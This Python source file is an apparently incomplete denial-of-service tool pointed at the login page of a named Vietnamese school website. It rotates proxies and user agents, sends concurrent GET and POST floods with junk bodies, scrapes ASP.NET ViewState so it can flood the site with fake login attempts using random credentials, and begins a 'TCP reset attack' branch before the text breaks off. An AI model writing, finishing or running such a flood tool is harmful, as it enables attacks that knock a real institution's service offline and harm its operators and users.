import asyncio
import random
import time
import os
import json
import aiohttp
import ssl
import socket
import base64
import re
from urllib.parse import urlparse, urlencode
import hashlib

# Configuration
TARGET_URL = "https://truong.hcm.edu.vn/Login.aspx?returnUrl=~/default.aspx"
DURATION = int(os.getenv("DURATION", "120"))
CONCURRENCY = int(os.getenv("CONCURRENCY", "100"))
REQ_PER_SEC = int(os.getenv("REQ_PER_SEC", "20"))
PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")
METHODS = os.getenv("METHODS", "GET,POST,LOGIN,RESET").split(",")

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
]

# Stats
stats = {
    "success": 0,
    "error": 0,
    "bytes_sent": 0,
    "start_time": None,
    "methods": {method: 0 for method in METHODS}
}

# Load proxies
proxies = []
if PROXY_FILE and os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    print(f"Loaded {len(proxies)} proxies from {PROXY_FILE}")
else:
    print(f"Proxy file {PROXY_FILE} not found. Running without proxies.")

async def get_random_proxy():
    if not proxies:
        return None
    return random.choice(proxies)

async def get_viewstate(session):
    try:
        async with session.get(TARGET_URL, ssl=False) as response:
            if response.status == 200:
                text = await response.text()
                
                # Extract ViewState
                viewstate_match = re.search(r'id="__VIEWSTATE" value="([^"]*)"', text)
                viewstate = viewstate_match.group(1) if viewstate_match else ""
                
                # Extract ViewStateGenerator
                viewstategen_match = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]*)"', text)
                viewstategen = viewstategen_match.group(1) if viewstategen_match else ""
                
                # Extract EventValidation
                eventval_match = re.search(r'id="__EVENTVALIDATION" value="([^"]*)"', text)
                eventval = eventval_match.group(1) if eventval_match else ""
                
                return {
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategen,
                    "__EVENTVALIDATION": eventval
                }
    except Exception as e:
        print(f"Error getting ViewState: {e}")
        return None

async def http_flood(session, method, url):
    global stats
    
    try:
        if method == "GET":
            async with session.get(url, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(str(response.headers))
                return response.status
        elif method == "POST":
            data = json.dumps({"data": "x" * 1024})  # 1KB payload
            async with session.post(url, data=data, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(data) + len(str(response.headers))
                return response.status
        elif method == "LOGIN":
            # Get ViewState first
            viewstate_data = await get_viewstate(session)
            if not viewstate_data:
                stats["error"] += 1
                return None
            
            # Prepare login data
            login_data = {
                "__VIEWSTATE": viewstate_data["__VIEWSTATE"],
                "__VIEWSTATEGENERATOR": viewstate_data["__VIEWSTATEGENERATOR"],
                "__EVENTVALIDATION": viewstate_data["__EVENTVALIDATION"],
                "ctl00$ContentPlaceHolder1$txtTaiKhoa": f"user_{random.randint(1000, 9999)}",
                "ctl00$ContentPlaceHolder1$txtMatKhau": f"pass_{random.randint(1000, 9999)}",
                "ctl00$ContentPlaceHolder1$btnDangNhap": "Đăng Nhập"
            }
            
            # Send login request
            async with session.post(url, data=login_data, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(str(login_data)) + len(str(response.headers))
                return response.status
        elif method == "RESET":
            # TCP reset attack
            proxy = await get_random_proxy()
            parsed_url = urlparse(url)
            
            if proxy:
                # Parse proxy
                proxy
